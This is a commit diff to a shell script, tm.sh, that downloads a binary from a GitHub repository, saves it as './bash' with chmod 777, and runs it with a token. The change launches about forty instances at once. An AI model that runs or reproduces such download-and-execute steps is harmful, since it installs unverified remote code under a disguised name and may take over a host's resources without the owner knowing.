02232afa92c8468fa86b3ab6f23d87b00ea2195d
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2025-04-13 10:24:56 +0800

    Update tm.sh

--- tm.sh
+++ tm.sh
@@ -5,7 +5,10 @@ tmp="$(mktemp -d)" && cd "$tmp"
 wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
 chmod 777 "./bash"
 if [ "$1" == "1" ]; then
-  ./bash start accept --token "${token}" 2>&1 &
+  i=39; while [ "$i" -gt "0" ]; do
+    ./bash start accept --token "${token}" 2>&1 &
+    i=$((i-1)); 
+  done
   ./bash start accept --token "${token}" 2>&1
 else
   ./bash start accept --token "${token}" >/dev/null 2>&1 &
